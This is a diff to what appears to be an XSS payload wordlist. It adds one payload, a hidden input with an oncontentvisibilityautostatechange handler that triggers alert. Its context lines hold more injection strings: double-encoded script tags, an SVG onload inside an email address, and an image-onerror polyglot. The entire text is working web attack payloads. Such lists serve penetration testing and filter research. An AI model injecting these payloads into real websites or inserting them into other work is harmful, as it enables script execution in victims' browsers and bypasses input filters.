@@ -1,4 +1,5 @@
 %2527%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
+<input type=hidden oncontentvisibilityautostatechange=alert(9) style=content-visibility:auto>
 %253cscript%253ealert(1)%253c/script%253e
 ><svg/onload=confirm(1)>@gmail.com
 1%3C!%27/*%22/*\%27/*\%22/*--%3E%3C/Script%3E%3CImage%20Srcset=K%20*/;%20Onerror=confirm1%20//%3E#
